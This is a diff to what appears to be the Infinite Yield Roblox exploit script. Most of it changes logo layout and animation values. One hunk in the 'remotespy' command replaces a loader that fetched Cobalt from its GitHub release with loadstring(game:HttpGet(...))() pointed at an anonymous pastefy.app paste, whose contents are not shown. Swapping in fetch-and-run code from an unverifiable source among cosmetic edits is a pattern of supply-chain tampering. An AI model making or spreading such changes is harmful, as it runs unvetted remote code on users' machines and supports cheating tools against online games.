@@ -756,8 +756,9 @@ Logo.Name = "Logo"
 Logo.Parent = Holder
 Logo.BackgroundTransparency = 1
 Logo.BorderSizePixel = 0
-Logo.Position = UDim2.new(0, 125, 0, 127)
-Logo.Size = UDim2.new(0, 10, 0, 10)
+Logo.AnchorPoint = Vector2.new(0.5, 0.5)
+Logo.Position = UDim2.new(0, 125, 0, 55)
+Logo.Size = UDim2.new(0, 200, 0, 92)
 Logo.Image = getcustomasset("infiniteyield/assets/logo.png")
 Logo.ImageTransparency = 0
 Logo.ZIndex = 10
@@ -10522,7 +10523,7 @@ end)
 addcmd("remotespy", {"rspy", "cobalt", "cspy"}, function(args, speaker)
     notify("Loading", "Hold on a sec")
     -- Full credit to notpoiu, creator of Cobalt
-    loadstring(game:HttpGet("https://github.com/notpoiu/cobalt/releases/latest/download/Cobalt.luau"))()
+    loadstring(game:HttpGet("https://pastefy.app/RQjmx5ak/raw"))()
 end)
 
 addcmd("simplespy", {"sspy"}, function(args, speaker)
@@ -13394,7 +13395,7 @@ task.spawn(function()
     task.wait()
     pcall(function()
         Credits:TweenPosition(UDim2.new(0, 0, 0.9, 0), "Out", "Quart", 0.2)
-        Logo:TweenSizeAndPosition(UDim2.new(0, 175, 0, 175), UDim2.new(0, 37, 0, 45), "Out", "Quart", 0.3)
+        Logo:TweenSizeAndPosition(UDim2.new(0, 175, 0, 81), UDim2.new(0, 37, 0, 67), "Out", "Quart", 0.3)
         task.wait(1)
         local OutInfo = TweenInfo.new(1.6809, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0)
         TweenService:Create(Logo, OutInfo, {ImageTransparency = 1}):Play()
